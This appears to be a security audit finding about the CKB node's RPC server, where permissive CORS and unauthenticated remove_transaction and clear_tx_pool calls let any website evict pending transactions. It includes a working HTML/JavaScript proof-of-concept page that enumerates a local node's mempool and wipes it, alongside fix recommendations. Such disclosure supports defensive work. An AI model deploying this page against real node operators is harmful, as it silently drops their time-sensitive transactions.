### Title
Unauthenticated `remove_transaction` / `clear_tx_pool` RPC Combined with Permissive CORS Allows Any Website to Evict Arbitrary Pending Transactions - (File: `rpc/src/server.rs`, `rpc/src/module/pool.rs`)

---

### Summary

The CKB RPC server applies `CorsLayer::permissive()` globally, setting `Access-Control-Allow-Origin: *` on every response. The `remove_transaction` and `clear_tx_pool` RPC methods carry no authentication and no submitter-ownership check. Any web page a node operator visits can therefore issue cross-origin JSON-RPC calls to `127.0.0.1:8114`, silently evict any pending transaction by hash, or wipe the entire mempool. This is the direct CKB analog of the vault manager removing profitable liquidity positions at will: an unconstrained privileged operation over shared pool state, reachable without any key or credential.

---

### Finding Description

**Root cause 1 — Permissive CORS with no authentication**

`rpc/src/server.rs` builds the Axum router with a single unconditional CORS layer:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    ...
    .layer(CorsLayer::permissive())   // ← Access-Control-Allow-Origin: *
    ...
```

No authentication middleware, no token check, and no IP-allowlist enforcement exists anywhere in the middleware stack. The only network-level protection is the default bind address (`127.0.0.1:8114`), but `CorsLayer::permissive()` instructs browsers to honour cross-origin requests to that address from any origin.

**Root cause 2 — `remove_transaction` and `clear_tx_pool` carry no ownership check**

`rpc/src/module/pool.rs` exposes two destructive pool-mutation methods:

```rust
#[rpc(name = "remove_transaction")]
fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;

#[rpc(name = "clear_tx_pool")]
fn clear_tx_pool(&self) -> Result<()>;
```

Their implementations delegate directly to `tx_pool.remove_local_tx(tx_hash.into())` and `tx_pool.clear_pool(snapshot)` respectively, with zero caller-identity or submitter-ownership verification. Any caller who can reach the HTTP endpoint can evict any transaction, regardless of who submitted it.

**Attack chain**

1. Victim runs a CKB full node with the default `Pool` RPC module enabled (the default production config).
2. Victim visits any attacker-controlled web page in a browser on the same machine.
3. The page issues a preflight `OPTIONS` to `http://127.0.0.1:8114/`; the server responds `Access-Control-Allow-Origin: *`, so the browser proceeds.
4. The page calls `get_raw_tx_pool` to enumerate all pending transaction hashes.
5. The page calls `remove_transaction` for each target hash, or calls `clear_tx_pool` once to wipe everything.
6. The pool is now empty; all evicted transactions must be resubmitted by their originators.

---

### Impact Explanation

- **Transaction denial of service**: Any pending transaction — including time-sensitive ones such as DAO withdrawal phase-2 transactions that must be committed within a specific epoch window — can be silently dropped from the local pool. If the deadline passes before the user notices and resubmits, the withdrawal is permanently delayed or the time-lock window is missed.
- **Pool-wide wipe**: `clear_tx_pool` removes every pending and proposed transaction in a single call. A node that serves as a relay hub loses all queued work instantly.
- **No trace left**: The eviction is indistinguishable from normal pool expiry from the submitter's perspective; the transaction simply disappears from `get_transaction` status.
- **Scope match**: This is a tx-pool admission / RPC authorization integrity failure. The impact — unconstrained removal of other users' in-flight state — maps directly to the "manager removes profitable positions before fees are calculated" pattern in the reference report.

---

### Likelihood Explanation

- The `Pool` RPC module is enabled by default in the production `ckb.toml`.
- `CorsLayer::permissive()` is hardcoded in `rpc/src/server.rs`; it is not a user-configurable option.
- No authentication is required; the attacker needs only to serve a web page that the node operator visits.
- The attack requires no special tooling: a few lines of `fetch()` JavaScript suffice.
- Likelihood is **medium**: it requires the operator to visit a malicious page, but the CORS misconfiguration is unconditional and the destructive RPC methods are always present when the `Pool` module is loaded.

---

### Recommendation

1. **Remove `CorsLayer::permissive()`** or replace it with an explicit allowlist (e.g., same-origin only, or a configurable `rpc.cors_allowed_origins`). There is no legitimate reason for a node's local RPC to be callable from arbitrary third-party origins.
2. **Gate destructive pool mutations behind a capability check**: `remove_transaction` and `clear_tx_pool` should require either a configurable bearer token or be restricted to a separate, non-default RPC module (e.g., `PoolAdmin`) that operators must explicitly enable.
3. **Add a submitter-identity field** to pool entries so that future ownership checks are possible if multi-user RPC access is ever supported.

---

### Proof of Concept

```html
<!-- attacker.html — served from any origin -->
<script>
const RPC = "http://127.0.0.1:8114";

async function rpc(method, params=[]) {
  const r = await fetch(RPC, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({id:1, jsonrpc:"2.0", method, params})
  });
  return (await r.json()).result;
}

(async () => {
  // Step 1: enumerate all pending tx hashes
  const pool = await rpc("get_raw_tx_pool", [true]);
  const hashes = Object.keys(pool?.pending ?? {});
  console.log("Pending txs:", hashes.length);

  // Step 2: evict each one (or use clear_tx_pool for a single call)
  for (const h of hashes) {
    const ok = await rpc("remove_transaction", [h]);
    console.log("Removed", h, ok);
  }
  // Alternative: await rpc("clear_tx_pool");
})();
</script>
```

The browser sends a CORS preflight; `CorsLayer::permissive()` in `rpc/src/server.rs:124` responds `Access-Control-Allow-Origin: *`; the actual POST proceeds; `remove_transaction` in `rpc/src/module/pool.rs:662–669` calls `tx_pool.remove_local_tx(tx_hash.into())` with no further checks; the transaction is gone. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/module/pool.rs (L254-255)
```rust
    #[rpc(name = "remove_transaction")]
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
```

**File:** rpc/src/module/pool.rs (L322-323)
```rust
    #[rpc(name = "clear_tx_pool")]
    fn clear_tx_pool(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** util/app-config/src/configs/rpc.rs (L24-61)
```rust
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize, Eq)]
#[serde(deny_unknown_fields)]
pub struct Config {
    /// RPC server listen addresses.
    pub listen_address: String,
    /// RPC TCP server listen addresses.
    ///
    /// Only TCP and WS are supported to subscribe events via the Subscription RPC module.
    #[serde(default)]
    pub tcp_listen_address: Option<String>,
    /// RPC WS server listen addresses.
    ///
    /// Only TCP and WS are supported to subscribe events via the Subscription RPC module.
    #[serde(default)]
    pub ws_listen_address: Option<String>,
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
    /// Number of RPC worker threads.
    pub threads: Option<usize>,
    /// Number of RPC batch limit.
    pub rpc_batch_limit: Option<usize>,
    /// Enabled RPC modules.
    pub modules: Vec<Module>,
    /// Rejects txs with scripts that might trigger known bugs
    #[serde(default)]
    pub reject_ill_transactions: bool,
    /// Whether enable deprecated RPC methods.
    ///
    /// Deprecated RPC methods are disabled by default.
    #[serde(default)]
    pub enable_deprecated_rpc: bool,
    /// Customized extra well known lock scripts.
    #[serde(default)]
    pub extra_well_known_lock_scripts: Vec<Script>,
    /// Customized extra well known type scripts.
    #[serde(default)]
    pub extra_well_known_type_scripts: Vec<Script>,
}
```
